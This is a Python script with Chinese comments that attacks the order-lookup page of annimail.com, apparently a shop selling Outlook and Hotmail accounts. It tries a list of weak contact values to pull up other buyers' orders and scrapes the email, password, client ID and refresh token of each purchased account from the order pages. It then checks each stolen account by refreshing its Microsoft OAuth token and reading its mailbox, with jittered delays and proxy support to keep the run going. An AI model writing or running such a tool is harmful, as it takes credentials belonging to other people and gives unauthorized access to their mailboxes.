#!/usr/bin/env python3
"""annimail 弱密码订单查询、卡密提取与邮箱验证脚本

功能流程：
1. 使用弱密码作为 contact 查询 annimail 订单（支持节点日志，仅搜索命中过的弱口令）
2. 进入订单详情页提取卡密凭证（跳过无更新的订单）
3. 保存凭证到 txt 文件（一行一个邮箱，格式 email----password----uuid----token）
4. 对每个邮箱进行 OAuth2 token 刷新 + 邮件列表读取验证，丢弃无效邮箱
5. 保存节点日志，记录命中弱口令和已处理订单

用法示例:
    python scripts/annimail_weak_contact_search.py --cookies "PHPSESSID=xxx"
    python scripts/annimail_weak_contact_search.py --cookies-file cookies.txt
    python scripts/annimail_weak_contact_search.py --validate-only
    python scripts/annimail_weak_contact_search.py --full-scan --cookies "..."
    python scripts/annimail_weak_contact_search.py --dry-run
"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any

import requests
from bs4 import BeautifulSoup

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

BASE_URL = "https://www.annimail.com"
VISITORS_PAGE_URL = f"{BASE_URL}/user/visitors.php"
SEARCH_ENDPOINT_URL = f"{BASE_URL}//user/visitors.php?action=visitors_search_by_info"
ORDER_DETAIL_URL_TEMPLATE = (
    f"{BASE_URL}/user/order.php?action=detail&out_trade_no={{out_trade_no}}"
)

REQUEST_TIMEOUT = 30
INTERVAL_SECONDS = 60
JITTER_SECONDS = 15
PAGE_DELAY_SECONDS = 3
DETAIL_DELAY_SECONDS = 2
VALIDATE_DELAY_SECONDS = 2.0  # 验证邮箱间停顿（秒）

# Microsoft OAuth2 端点（与 outlookEmailPlus 保持一致）
MS_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
MS_TOKEN_SCOPE = "https://graph.microsoft.com/.default"
GRAPH_MAIL_URL = "https://graph.microsoft.com/v1.0/me/messages?$top=1&$select=id"
# 失效 token 的错误关键词（来自 outlookEmailPlus 分类逻辑）
INVALID_TOKEN_KEYWORDS = ("invalid_grant", "aadsts70000")

# 节点日志文件名
CHECKPOINT_FILENAME = "annimail_checkpoint.json"

# 卡密凭证行正则：email----password----uuid----token
CRED_LINE_RE = re.compile(
    r"[\w.-]+@(?:outlook|hotmail)\.com"
    r"----[\w-]+"
    r"----[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}"
    r"----.+",
)

# 弱密码 / 常见简单 contact 值列表
WEAK_CONTACTS: list[str] = [
    "123123", "112233", "123456", "654321", "111111",
    "222222", "333333", "444444", "555555", "666666",
    "777777", "888888", "999999", "000000", "12345678",
    "87654321", "123456789", "987654321", "1234567890",
    "11111111", "00000000", "123123123", "1234", "12345",
    "1234567", "111222", "121212", "131313", "11223344",
    "123321", "abc123", "password", "admin", "qwerty",
    "456789", "789456", "456123", "147258", "258963",
    "159357",
]

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/149.0.0.0 Safari/537.36"
)


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------


def now_text() -> str:
    return datetime.now().strftime("%H:%M:%S")


def log(message: str) -> None:
    print(f"[{now_text()}] {message}", flush=True)


def jittered_sleep(base: float, jitter: float = JITTER_SECONDS) -> None:
    actual = base + random.uniform(-jitter, jitter)
    if actual < 1:
        actual = 1.0
    time.sleep(actual)


def parse_cookies(cookie_str: str | None) -> dict[str, str]:
    if not cookie_str:
        return {}
    cookies: dict[str, str] = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            key, _, value = part.partition("=")
            cookies[key.strip()] = value.strip()
    return cookies


def extract_token(html: str) -> str | None:
    soup = BeautifulSoup(html, "lxml")

    token_input = soup.find("input", attrs={"name": "token"})
    if token_input and token_input.get("value"):
        return str(token_input["value"]).strip()

    meta = soup.find("meta", attrs={"name": re.compile(r"csrf.?token", re.IGNORECASE)})
    if meta and meta.get("content"):
        return str(meta["content"]).strip()

    meta2 = soup.find("meta", attrs={"name": "token"})
    if meta2 and meta2.get("content"):
        return str(meta2["content"]).strip()

    match = re.search(
        r'(?:var\s+)?token\s*[=:]\s*["\']([a-f0-9]{32,64})["\']',
        html, re.IGNORECASE,
    )
    if match:
        return match.group(1)

    el = soup.find(attrs={"data-token": True})
    if el:
        return str(el["data-token"]).strip()

    match = re.search(
        r'token["\']?\s*[:=]\s*["\']([a-f0-9]{40})["\']',
        html, re.IGNORECASE,
    )
    if match:
        return match.group(1)

    return None


def is_login_page(html: str) -> bool:
    if not html:
        return True
    lowered = html.lower()
    indicators = ["登录", "login", "请先登录", "password\" name=", "action=\"login"]
    hits = sum(1 for ind in indicators if ind in lowered)
    return hits >= 2 and len(html) < 5000


def sanitize_filename(time_text: str) -> str:
    safe = time_text.replace(" ", "_").replace(":", "-")
    safe = re.sub(r'[<>:"/\\|?*]', "", safe)
    return safe


# ---------------------------------------------------------------------------
# annimail 核心流程
# ---------------------------------------------------------------------------


def fetch_token(session: requests.Session, timeout: int) -> str | None:
    try:
        resp = session.get(VISITORS_PAGE_URL, timeout=timeout)
        resp.raise_for_status()
    except requests.RequestException as exc:
        log(f"  ✗ 获取页面失败: {exc}")
        return None

    if is_login_page(resp.text):
        log("  ⚠ 页面疑似登录页，请检查 Cookie 是否有效")

    token = extract_token(resp.text)
    if token:
        log(f"  提取到 token: {token[:8]}...{token[-4:]}")
    else:
        log("  ⚠ 未能在页面中提取到 token")
    return token


def search_orders(
    session: requests.Session,
    contact: str,
    token: str,
    timeout: int,
) -> list[dict[str, Any]]:
    all_orders: list[dict[str, Any]] = []
    page = 1

    while True:
        data = {"contact": contact, "token": token, "page": str(page)}
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Referer": VISITORS_PAGE_URL,
            "Origin": BASE_URL,
        }

        try:
            resp = session.post(
                SEARCH_ENDPOINT_URL, data=data, headers=headers, timeout=timeout,
            )
            resp.raise_for_status()
            result = resp.json()
        except requests.RequestException as exc:
            log(f"  ✗ 搜索请求失败 (page {page}): {exc}")
            break
        except json.JSONDecodeError:
            log(f"  ✗ 搜索响应非 JSON (page {page})")
            break

        code = result.get("code")
        if code != 200:
            log(f"  ✗ 搜索返回错误: code={code}, msg={result.get('msg', 'unknown')}")
            break

        data_obj = result.get("data") or {}
        order_list = data_obj.get("list") or []
        if not order_list:
            break

        all_orders.extend(order_list)
        log(f"  第 {page} 页: 获取 {len(order_list)} 条 (累计 {len(all_orders)})")

        if not data_obj.get("hasMore"):
            break

        page += 1
        jittered_sleep(PAGE_DELAY_SECONDS, 1.5)

    return all_orders


def fetch_order_detail(
    session: requests.Session,
    out_trade_no: str,
    timeout: int,
) -> str:
    url = ORDER_DETAIL_URL_TEMPLATE.format(out_trade_no=out_trade_no)
    try:
        resp = session.get(url, timeout=timeout)
        resp.raise_for_status()
        return resp.text
    except requests.RequestException as exc:
        log(f"  ✗ 获取订单详情失败 ({out_trade_no}): {exc}")
        return ""


def extract_credential_lines(html: str) -> list[str]:
    if not html:
        return []
    soup = BeautifulSoup(html, "lxml")
    full_text = soup.get_text(separator="\n", strip=True)

    seen: set[str] = set()
    lines: list[str] = []
    for line in full_text.split("\n"):
        line = line.strip()
        if CRED_LINE_RE.match(line) and line not in seen:
            seen.add(line)
            lines.append(line)
    return lines


def save_card_info(
    output_dir: Path,
    order: dict[str, Any],
    cred_lines: list[str],
) -> Path | None:
    if not cred_lines:
        return None

    pay_time_text = order.get("pay_time_text") or ""
    out_trade_no = order.get("out_trade_no") or ""

    first_email = cred_lines[0].split("----")[0].lower()
    domain = "hotmail" if "@hotmail.com" in first_email else "outlook"

    if pay_time_text:
        base_name = sanitize_filename(pay_time_text)
    else:
        base_name = "未付款"

    filepath = output_dir / f"{base_name}-{domain}.txt"
    if filepath.exists():
        filepath = output_dir / f"{base_name}-{domain}_{out_trade_no}.txt"

    filepath.parent.mkdir(parents=True, exist_ok=True)
    filepath.write_text("\n".join(cred_lines) + "\n", encoding="utf-8")
    return filepath


# ---------------------------------------------------------------------------
# 邮箱验证（Microsoft OAuth2 token 刷新 + 邮件列表读取）
# ---------------------------------------------------------------------------


def refresh_oauth_token(
    client_id: str,
    refresh_token: str,
    session: requests.Session,
    timeout: int,
    max_retries: int = 3,
) -> tuple[str | None, str | None]:
    """使用 refresh_token 刷新 OAuth2 access_token。

    Returns: (access_token, new_refresh_token) 或 (None, None)
    """
    data = {
        "client_id": client_id,
        "refresh_token": refresh_token,
        "grant_type": "refresh_token",
        "scope": MS_TOKEN_SCOPE,
    }
    for attempt in range(max_retries + 1):
        try:
            resp = session.post(
                MS_TOKEN_URL,
                data=data,
                timeout=timeout,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if resp.status_code == 200:
                result = resp.json()
                return result.get("access_token"), result.get("refresh_token")
            elif resp.status_code == 429:
                retry_after = int(resp.headers.get("Retry-After", "5"))
                wait = min(retry_after, 30)
                log(f"    ⚠ 速率限制，等待 {wait}s 后重试")
                time.sleep(wait)
                continue
            else:
                # 非 429 的明确错误（400/401/403 等）不重试，直接返回
                # 参考 outlookEmailPlus: test_refresh_token_with_rotation
                try:
                    error_data = resp.json()
                except Exception:
                    error_data = {}
                error_msg = ""
                if isinstance(error_data, dict):
                    error_msg = str(
                        error_data.get("error_description")
                        or error_data.get("error")
                        or ""
                    )
                normalized = error_msg.lower()
                if any(kw in normalized for kw in INVALID_TOKEN_KEYWORDS):
                    return None, None
                # 其他错误也直接返回，不重试
                return None, None
        except (requests.RequestException, json.JSONDecodeError):
            if attempt < max_retries:
                time.sleep(2 ** attempt)
                continue
            return None, None
    return None, None


def check_mailbox(
    access_token: str,
    session: requests.Session,
    timeout: int,
    max_retries: int = 3,
) -> bool:
    """检查能否读取邮件列表。"""
    for attempt in range(max_retries + 1):
        try:
            resp = session.get(
                GRAPH_MAIL_URL,
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=timeout,
            )
            if resp.status_code == 200:
                return True
            elif resp.status_code == 429:
                retry_after = int(resp.headers.get("Retry-After", "10"))
                wait = min(retry_after, 30)
                log(f"    ⚠ 速率限制，等待 {wait}s 后重试")
                time.sleep(wait)
                continue
            else:
                return False
        except requests.RequestException:
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False
    return False


def validate_credential(
    cred_line: str,
    session: requests.Session,
    timeout: int,
) -> tuple[str | None, str]:
    """验证单个凭证行：刷新 token + 读取邮件列表。

    Returns: (updated_cred_line | None, status_message)
    - 有效时返回（可能更新了 token 的）凭证行
    - 无效时返回 None
    """
    parts = cred_line.split("----", 3)
    if len(parts) < 4:
        return None, "格式错误"

    email, password, client_id, refresh_token = parts

    # 步骤 1: 刷新 token
    access_token, new_refresh_token = refresh_oauth_token(
        client_id, refresh_token, session, timeout,
    )
    if not access_token:
        return None, "token刷新失败"

    # 步骤 2: 读取邮件列表
    if not check_mailbox(access_token, session, timeout):
        return None, "无法读取邮件列表"

    # token 已更新则写回新 token
    if new_refresh_token and new_refresh_token != refresh_token:
        return f"{email}----{password}----{client_id}----{new_refresh_token}", "有效(token已更新)"
    return cred_line, "有效"


def validate_all_files(
    output_dir: Path,
    timeout: int,
    proxy: str = "",
    delay: float = VALIDATE_DELAY_SECONDS,
) -> dict[str, int]:
    """验证输出目录下所有 txt 文件中的邮箱。

    保留有效邮箱（可能含更新后的 token），丢弃无效邮箱。
    文件全部无效则删除文件。
    """
    txt_files = sorted(output_dir.glob("*.txt"))
    if not txt_files:
        log("没有需要验证的文件")
        return {"total": 0, "valid": 0, "invalid": 0, "files_updated": 0, "files_deleted": 0}

    # 独立会话（不携带 annimail cookies）
    ms_session = requests.Session()
    ms_session.headers.update({
        "User-Agent": DEFAULT_UA,
        "Accept": "application/json",
    })
    if proxy:
        ms_session.proxies = {"http": proxy, "https": proxy}

    total = 0
    valid_count = 0
    invalid_count = 0
    files_updated = 0
    files_deleted = 0

    log(f"\n{'=' * 60}")
    log(f"阶段 4: 邮箱验证（token刷新 + 邮件列表读取）")
    log(f"{'=' * 60}")

    for file_idx, filepath in enumerate(txt_files):
        raw = filepath.read_text(encoding="utf-8").strip()
        lines = [l for l in raw.split("\n") if l.strip()]
        file_total = len(lines)

        if file_total == 0:
            filepath.unlink()
            files_deleted += 1
            continue

        log(f"\n[{file_idx + 1}/{len(txt_files)}] {filepath.name} ({file_total} 条)")

        kept_lines: list[str] = []
        file_invalid = 0

        for line_idx, line in enumerate(lines):
            total += 1
            updated_line, status = validate_credential(line, ms_session, timeout)

            if updated_line:
                kept_lines.append(updated_line)
                valid_count += 1
            else:
                invalid_count += 1
                file_invalid += 1
                email = line.split("----")[0] if "----" in line else line[:30]
                log(f"  ✗ {email} - {status}")

            if (line_idx + 1) % 50 == 0:
                log(f"  进度: {line_idx + 1}/{file_total} (有效 {len(kept_lines)}, 无效 {file_invalid})")

            if line_idx < file_total - 1:
                time.sleep(delay)

        # 重写文件（仅保留有效行）
        if file_invalid > 0 or len(kept_lines) != file_total:
            if kept_lines:
                filepath.write_text("\n".join(kept_lines) + "\n", encoding="utf-8")
                files_updated += 1
                log(f"  → 保留 {len(kept_lines)}/{file_total} 条，已更新文件")
            else:
                filepath.unlink()
                files_deleted += 1
                log(f"  → 全部无效，已删除文件")
        else:
            log(f"  ✓ 全部有效 ({len(kept_lines)}/{file_total})")

    log(f"\n验证完成:")
    log(f"  总计: {total} | 有效: {valid_count} | 无效: {invalid_count}")
    log(f"  更新文件: {files_updated} | 删除文件: {files_deleted}")

    return {
        "total": total, "valid": valid_count, "invalid": invalid_count,
        "files_updated": files_updated, "files_deleted": files_deleted,
    }


# ---------------------------------------------------------------------------
# 节点日志
# ---------------------------------------------------------------------------


def load_checkpoint(path: Path) -> dict[str, Any]:
    """加载节点日志。"""
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        log(f"⚠ 节点日志损坏，忽略: {path}")
        return {}


def save_checkpoint(path: Path, checkpoint: dict[str, Any]) -> None:
    """保存节点日志。"""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(checkpoint, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )


# ---------------------------------------------------------------------------
# CLI 参数
# ---------------------------------------------------------------------------


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="annimail 弱密码订单查询、卡密提取与邮箱验证脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python scripts/annimail_weak_contact_search.py --cookies 'key=val'\n"
            "  python scripts/annimail_weak_contact_search.py --validate-only\n"
            "  python scripts/annimail_weak_contact_search.py --full-scan --cookies 'key=val'\n"
            "  python scripts/annimail_weak_contact_search.py --dry-run\n"
        ),
    )
    parser.add_argument("--cookies", type=str, default="", help="会话 Cookie 字符串")
    parser.add_argument("--cookies-file", type=Path, help="从文件读取 Cookie")
    parser.add_argument(
        "--output-dir", type=Path,
        default=Path(__file__).resolve().parent / "annimail_orders",
        help="卡密信息输出目录",
    )
    parser.add_argument("--interval", type=int, default=INTERVAL_SECONDS, help="每轮弱密码间隔秒数")
    parser.add_argument("--timeout", type=int, default=REQUEST_TIMEOUT, help="请求超时秒数")
    parser.add_argument("--proxy", type=str, default="", help="代理地址")
    parser.add_argument("--save-html", action="store_true", help="保存订单详情页 HTML（调试）")
    parser.add_argument("--dry-run", action="store_true", help="只打印执行计划")
    parser.add_argument("--validate-only", action="store_true", help="仅验证已有文件中的邮箱")
    parser.add_argument("--full-scan", action="store_true", help="忽略节点日志，全量扫描所有弱口令")
    parser.add_argument("--skip-validation", action="store_true", help="跳过邮箱验证阶段")
    parser.add_argument(
        "--validate-delay", type=float, default=VALIDATE_DELAY_SECONDS,
        help=f"邮箱验证间停顿秒数，默认 {VALIDATE_DELAY_SECONDS}",
    )
    return parser.parse_args(argv)


# ---------------------------------------------------------------------------
# 主函数
# ---------------------------------------------------------------------------


def main(argv: list[str]) -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8")

    args = parse_args(argv)

    # 解析 Cookie
    cookie_str = args.cookies
    if args.cookies_file and args.cookies_file.exists():
        cookie_str = args.cookies_file.read_text(encoding="utf-8").strip()
    cookies = parse_cookies(cookie_str)

    # --validate-only 模式：仅验证已有文件
    if args.validate_only:
        args.output_dir.mkdir(parents=True, exist_ok=True)
        log("=== 仅验证模式 ===")
        validate_all_files(args.output_dir, args.timeout, args.proxy, args.validate_delay)
        return 0

    # 加载节点日志
    checkpoint_path = args.output_dir / CHECKPOINT_FILENAME
    checkpoint = load_checkpoint(checkpoint_path) if not args.full_scan else {}
    known_orders: dict[str, Any] = checkpoint.get("known_orders", {})

    # 确定搜索用的弱口令列表
    if checkpoint.get("hit_contacts") and not args.full_scan:
        contacts_to_try = checkpoint["hit_contacts"]
        log(f"使用节点日志中的 {len(contacts_to_try)} 个命中弱口令: {', '.join(contacts_to_try)}")
    else:
        contacts_to_try = WEAK_CONTACTS
        log(f"使用全部 {len(contacts_to_try)} 个弱口令")

    log(f"输出目录: {args.output_dir}")
    log(f"间隔: {args.interval}s | 超时: {args.timeout}s")
    log(f"已知订单: {len(known_orders)} 个")

    if args.dry_run:
        log("\n=== Dry run 模式 ===")
        for i, wp in enumerate(contacts_to_try):
            log(f"  [{i + 1}/{len(contacts_to_try)}] contact={wp}")
        total_time = args.interval * (len(contacts_to_try) - 1)
        log(f"\n预计总耗时（仅搜索阶段）: ~{total_time // 60} 分 {total_time % 60} 秒")
        return 0

    # 创建会话
    session = requests.Session()
    session.headers.update({
        "User-Agent": DEFAULT_UA,
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    if cookies:
        session.cookies.update(cookies)
        log(f"已设置 {len(cookies)} 个 Cookie")
    else:
        log("⚠ 未提供 Cookie")
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
        log(f"使用代理: {args.proxy}")

    # ---- 阶段 1: 弱密码订单搜索 ----
    all_orders: dict[str, dict[str, Any]] = {}
    hit_contacts: list[str] = []
    total_attempts = len(contacts_to_try)

    log(f"\n{'=' * 60}")
    log(f"阶段 1: 弱密码订单搜索（共 {total_attempts} 轮，间隔 {args.interval}s）")
    log(f"{'=' * 60}")

    for i, contact in enumerate(contacts_to_try):
        log(f"\n[{i + 1}/{total_attempts}] 尝试 contact={contact}")

        token = fetch_token(session, args.timeout)
        if not token:
            log("  跳过（无法获取 token）")
            if i < total_attempts - 1:
                wait = max(args.interval + random.randint(-JITTER_SECONDS, JITTER_SECONDS), 30)
                log(f"  等待 ~{wait}s ...")
                time.sleep(wait)
            continue

        orders = search_orders(session, contact, token, args.timeout)
        if orders:
            if contact not in hit_contacts:
                hit_contacts.append(contact)
            new_count = 0
            for order in orders:
                otn = order.get("out_trade_no")
                if otn and otn not in all_orders:
                    all_orders[otn] = order
                    new_count += 1
            log(f"  ✓ 本轮获取 {len(orders)} 条，新增 {new_count} 条不重复订单")
        else:
            log("  未找到订单")

        if i < total_attempts - 1:
            wait = max(args.interval + random.randint(-JITTER_SECONDS, JITTER_SECONDS), 30)
            log(f"  等待 ~{wait}s ...")
            time.sleep(wait)

    log(f"\n{'=' * 60}")
    log(f"搜索完成，共收集到 {len(all_orders)} 条不重复订单（命中弱口令 {len(hit_contacts)} 个）")
    log(f"{'=' * 60}")

    if not all_orders:
        log("没有找到任何订单")
        # 即使没有新订单，仍可验证已有文件
        if not args.skip_validation:
            validate_all_files(args.output_dir, args.timeout, args.proxy, args.validate_delay)
        # 保存节点日志
        existing_hits = set(checkpoint.get("hit_contacts", []))
        existing_hits.update(hit_contacts)
        save_checkpoint(checkpoint_path, {
            "last_run": datetime.now().isoformat(),
            "hit_contacts": sorted(existing_hits),
            "known_orders": known_orders,
        })
        log(f"节点日志已保存: {checkpoint_path}")
        return 0

    # ---- 阶段 2: 过滤无更新订单 + 按时间倒序排序 ----
    sorted_orders = sorted(
        all_orders.values(),
        key=lambda o: int(o.get("pay_time") or o.get("create_time") or 0),
        reverse=True,
    )

    new_orders: list[dict[str, Any]] = []
    skipped_count = 0
    for order in sorted_orders:
        otn = order.get("out_trade_no", "")
        pay_time = str(order.get("pay_time", ""))
        if otn in known_orders and known_orders[otn].get("pay_time") == pay_time:
            skipped_count += 1
            continue
        new_orders.append(order)
        known_orders[otn] = {
            "pay_time": pay_time,
            "pay_time_text": order.get("pay_time_text", ""),
        }

    log(f"\n按时间倒序排序完成")
    log(f"  总订单: {len(sorted_orders)} | 新增/更新: {len(new_orders)} | 跳过(无更新): {skipped_count}")

    # ---- 阶段 3: 提取卡密（仅新/更新订单） ----
    if new_orders:
        args.output_dir.mkdir(parents=True, exist_ok=True)
        html_dir = args.output_dir / "_html"
        if args.save_html:
            html_dir.mkdir(parents=True, exist_ok=True)

        saved_files: list[Path] = []

        log(f"\n{'=' * 60}")
        log(f"阶段 3: 订单详情页卡密提取（共 {len(new_orders)} 个新订单）")
        log(f"{'=' * 60}")

        for i, order in enumerate(new_orders):
            out_trade_no = order.get("out_trade_no", "")
            pay_time_text = order.get("pay_time_text", "")
            title = order.get("title", "")

            log(f"\n[{i + 1}/{len(new_orders)}] {out_trade_no}")
            log(f"  时间: {pay_time_text}")
            log(f"  商品: {title[:40]}{'...' if len(title) > 40 else ''}")

            html = fetch_order_detail(session, out_trade_no, args.timeout)
            if not html:
                log("  ✗ 无法获取详情页，跳过")
                continue

            if args.save_html:
                html_path = html_dir / f"{out_trade_no}.html"
                html_path.write_text(html, encoding="utf-8")

            cred_lines = extract_credential_lines(html)
            if cred_lines:
                filepath = save_card_info(args.output_dir, order, cred_lines)
                if filepath:
                    saved_files.append(filepath)
                    log(f"  ✓ 已保存: {filepath.name} ({len(cred_lines)} 条)")
            else:
                log("  ⚠ 未提取到卡密信息")

            if i < len(new_orders) - 1:
                jittered_sleep(DETAIL_DELAY_SECONDS, 1.0)

        log(f"\n卡密提取完成，保存 {len(saved_files)} 个文件")
    else:
        log("\n没有新订单需要处理，跳过卡密提取阶段")

    # ---- 阶段 4: 邮箱验证 ----
    if not args.skip_validation:
        validate_all_files(args.output_dir, args.timeout, args.proxy, args.validate_delay)
    else:
        log("\n跳过邮箱验证阶段（--skip-validation）")

    # ---- 阶段 5: 保存节点日志 ----
    existing_hits = set(checkpoint.get("hit_contacts", []))
    existing_hits.update(hit_contacts)

    save_checkpoint(checkpoint_path, {
        "last_run": datetime.now().isoformat(),
        "hit_contacts": sorted(existing_hits),
        "known_orders": known_orders,
    })
    log(f"\n节点日志已保存: {checkpoint_path}")
    log(f"  命中弱口令: {len(existing_hits)} 个")
    log(f"  已知订单: {len(known_orders)} 个")

    # ---- 汇总 ----
    log(f"\n{'=' * 60}")
    log(f"全部完成！")
    log(f"  输出目录: {args.output_dir}")
    log(f"{'=' * 60}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
